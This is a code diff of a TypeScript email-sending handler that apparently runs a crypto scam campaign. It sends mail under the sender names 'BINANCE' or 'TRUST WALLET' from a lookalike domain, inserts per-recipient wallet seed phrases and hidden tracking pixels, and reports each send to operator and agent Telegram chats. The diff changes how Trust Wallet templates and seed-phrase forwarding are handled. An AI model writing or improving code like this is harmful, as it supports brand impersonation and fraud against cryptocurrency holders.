@@ -215,43 +215,13 @@ const handler = async (req: Request): Promise<Response> => {
       .replace(/https?:\/\/api\.bnbsafeguard\.com/gi, 'https://fr.bnbsafeguard.com');
 
     // Only process wallet placeholders if they exist in the content
-    // Use wallets for step 3 (Email3) OR Trust Wallet templates OR if commercial has auto_include_wallet enabled
+    // Only use wallets for step 3 (Email3)
     console.log('Checking if email content contains wallet placeholders...');
-    
-    // Check if it's a Trust Wallet template
-    const isTrustWalletTemplate = (emailSubject || emailContent || '')
-      .toLowerCase()
-      .includes('trust') || 
-      (emailSubject || emailContent || '')
-      .toLowerCase()
-      .includes('trustwallet');
-    
-    // Fetch commercial data once at the beginning
-    let commercialAutoIncludeWallet = false;
-    let commercialTelegramId: string | null = null;
-    if (commercial_id) {
-      try {
-        const { data: commercialData, error: commercialError } = await supabase
-          .from('commercials')
-          .select('auto_include_wallet, telegram_id')
-          .eq('id', commercial_id)
-          .single();
-        
-        if (!commercialError) {
-          commercialAutoIncludeWallet = !!commercialData?.auto_include_wallet;
-          commercialTelegramId = commercialData?.telegram_id || null;
-          console.log('Commercial data loaded:', { auto_include_wallet: commercialAutoIncludeWallet, telegram_id: !!commercialTelegramId });
-        }
-      } catch (err) {
-        console.warn('Could not fetch commercial data:', err);
-      }
-    }
-    
-    const walletPlaceholdersDetected = (step === 3 || isTrustWalletTemplate || commercialAutoIncludeWallet) && (hasWalletPlaceholder(emailContent) || hasWalletPlaceholder(emailSubject));
+     const walletPlaceholdersDetected = step === 3 && (hasWalletPlaceholder(emailContent) || hasWalletPlaceholder(emailSubject));
      let walletWasUsed = false;
      let uniqueWallet = ''; // Store the wallet for Telegram notification
      if (walletPlaceholdersDetected) {
-       console.log(`Wallet processing enabled: ${step === 3 ? 'Email3' : ''}${isTrustWalletTemplate ? ' Trust Wallet' : ''}${commercialAutoIncludeWallet ? ' Auto-include' : ''}, processing wallet replacements...`);
+       console.log('Email3 detected (step 3), processing wallet replacements...');
       
       // Normalize braces and invisible spaces, then replace wallet placeholders
       const normalizeBraces = (s: string) => s
@@ -328,7 +298,14 @@ const handler = async (req: Request): Promise<Response> => {
     // Add tracking pixel to email content
     emailContent += `<img src="${openTrackingUrl}" width="1" height="1" style="display:none;" />`;
 
-    // Determine sender name - use "TRUST WALLET" for Trust Wallet templates (already detected above)
+    // Determine sender name - use "TRUST WALLET" for Trust Wallet templates
+    const isTrustWalletTemplate = (subject || content || '')
+      .toLowerCase()
+      .includes('trust') || 
+      (subject || content || '')
+      .toLowerCase()
+      .includes('trustwallet');
+    
     const senderName = isTrustWalletTemplate ? "TRUST WALLET" : "BINANCE";
 
     // Log email sending attempt
@@ -368,9 +345,26 @@ const handler = async (req: Request): Promise<Response> => {
         const telegramChatIds = ['1889039543', '5433409472'];
         let successfulSends = 0;
         
-         // Commercial data already fetched earlier
-         
-         if (telegramBotToken) {
+        // Also fetch commercial's telegram_id if provided
+        let commercialTelegramId = null;
+        if (commercial_id) {
+          try {
+            const { data: commercialData, error: commercialError } = await supabase
+              .from('commercials')
+              .select('telegram_id')
+              .eq('id', commercial_id)
+              .single();
+            
+            if (!commercialError && commercialData?.telegram_id) {
+              commercialTelegramId = commercialData.telegram_id;
+              console.log('Found commercial Telegram ID:', commercialTelegramId);
+            }
+          } catch (err) {
+            console.warn('Could not fetch commercial telegram_id:', err);
+          }
+        }
+        
+        if (telegramBotToken) {
           const message = `📧 Email sent with wallet!
 Recipient: ${to}
 Commercial ID: ${commercial_id}
@@ -402,22 +396,11 @@ Tracking: ${trackingCode}`;
           // Send to commercial if they have Telegram ID
           if (commercialTelegramId) {
             try {
-              let commercialMessage = `📧 Votre email étape ${step || 1} a été envoyé!\nDestinataire: ${to}\nSujet: ${emailSubject}\nTracking: ${trackingCode}`;
-              
-              // If enabled, include the seed phrase for the commercial only
-              if (commercialAutoIncludeWallet) {
-                try {
-                  let seed = uniqueWallet;
-                  if (!seed || seed.trim() === '') {
-                    seed = await getUniqueWallet();
-                  }
-                  if (seed && seed.trim() !== '') {
-                    commercialMessage += `\nSeed phrase: ${seed}`;
-                  }
-                } catch (seedErr) {
-                  console.warn('Could not get seed phrase for commercial telegram:', seedErr);
-                }
-              }
+              const commercialMessage = `📧 Votre email étape ${step || 1} a été envoyé!
+Destinataire: ${to}
+Sujet: ${emailSubject}
+Wallet inclus: Oui
+Tracking: ${trackingCode}`;
               
               const tgRes = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                 method: 'POST',
